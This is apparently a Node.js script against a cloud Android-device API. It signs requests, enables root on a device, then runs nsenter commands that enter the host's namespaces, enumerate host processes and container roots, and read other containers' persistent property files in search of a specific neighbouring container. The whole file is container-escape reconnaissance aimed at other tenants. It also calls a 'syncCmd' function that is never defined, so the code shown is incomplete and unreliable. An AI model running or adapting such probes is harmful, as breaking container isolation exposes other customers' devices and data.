#!/usr/bin/env node
/**
 * Probe host /proc from D1 via nsenter to find .220 container
 */
const https = require('https');
const crypto = require('crypto');

const { AK, SK, HOST, D1, CT, SHD } = require('../shared/vmos_api');

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8);
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  const sig = crypto.createHmac('sha256', k).update(sts).digest('hex');
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${sig}` };
}

function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {});
    const h = sign(b);
    const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 500) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);

async function main() {
  // Enable root
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D1], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  
  // Verify root
  log('Verifying root...');
  const id = await syncCmd(D1, 'id', 10);
  log('id: ' + id.slice(0, 100));

  // 1. D1 own cgroup
  log('\n=== D1 cgroup info ===');
  const cg = await syncCmd(D1, 'cat /proc/self/cgroup 2>&1; echo ---INIT---; cat /proc/1/cgroup 2>&1', 10);
  log(cg);

  // 2. nsenter PID count
  log('\n=== Host PID count ===');
  const pidCount = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ls /proc/ | grep -c ^[0-9]"', 15);
  log('PIDs: ' + pidCount);

  // 3. PID 1 info from host
  log('\n=== Host PID 1 ===');
  const pid1 = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "cat /proc/1/cmdline 2>/dev/null | tr \\\\0 _; echo; cat /proc/1/cgroup 2>/dev/null"', 15);
  log(pid1);

  // 4. List /proc/*/root availability
  log('\n=== PIDs with accessible /proc/PID/root ===');
  const roots = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "for p in 1 2 $(seq 100 10 500); do if [ -d /proc/$p/root/data ]; then echo HASROOT:$p; fi; done"', 30);
  log(roots);

  // 5. Find all init-like processes
  log('\n=== Init processes on host ===');
  const inits = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ps -eo pid,comm 2>/dev/null | grep init | head -30"', 15);
  log(inits);

  // 6. Alternative: just try ls /proc/*/root/data/property
  log('\n=== PIDs with persistent_properties ===');
  const props = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ls /proc/*/root/data/property/persistent_properties 2>/dev/null | head -20"', 30);
  log(props);

  // 7. Try reading /proc/self vs /proc/1 after nsenter
  log('\n=== nsenter self identity ===');
  const selfId = await syncCmd(D1, 'nsenter -t 1 -m -u -i -n -p -- sh -c "id; hostname; ip addr show 2>/dev/null | grep inet | head -5"', 15);
  log(selfId);

  // 8. Check if D1 is actually containerized
  log('\n=== D1 mount namespace ===');
  const mounts = await syncCmd(D1, 'mount | grep -E "overlay|lxc|cgroup" | head -10', 10);
  log(mounts);

  // 9. Try direct read of another container from host mount namespace
  log('\n=== Host filesystem scan ===');
  const hostFs = await syncCmd(D1, 'nsenter -t 1 -m -- sh -c "ls / 2>&1 | head -20; echo ---; ls /data 2>&1 | head -10; echo ---; ls /containers 2>&1 | head -10; echo ---; ls /var/lib/lxc 2>&1 | head -10; echo ---; find / -maxdepth 2 -name containers -type d 2>/dev/null | head -5"', 30);
  log(hostFs);
}

main().catch(e => console.error('FATAL:', e));
